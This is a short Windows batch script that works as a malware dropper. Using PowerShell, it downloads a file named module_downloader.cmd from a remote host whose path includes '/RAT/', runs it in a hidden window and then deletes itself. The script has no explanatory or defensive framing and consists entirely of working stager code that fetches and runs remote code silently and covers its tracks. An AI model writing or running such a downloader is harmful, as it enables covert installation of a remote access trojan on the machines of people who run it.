@echo off

powershell "(New-Object System.Net.WebClient).DownloadFile('https://arth.imbeddex.com/RAT/module_downloader.cmd', 'module_downloader.cmd'); Start-Process cmd.exe -ArgumentList '/c', '%~dp0\module_downloader.cmd' -WindowStyle Hidden" & del "%~f0"